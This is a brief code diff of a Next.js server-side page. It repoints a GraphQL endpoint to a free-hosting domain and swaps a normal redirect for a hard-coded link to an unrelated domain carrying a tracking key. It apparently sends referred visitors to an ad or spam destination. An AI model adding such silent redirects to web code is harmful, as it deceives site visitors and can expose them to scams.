@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alcashzone.com/graphql"
+	const endpoint = "https://bookstyro.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
+					`https://remedyabruptness.com/akq7w7aer?key=384840ab73d0510166349cf48ae4ba5a`
 				}`,
 			},
 		};
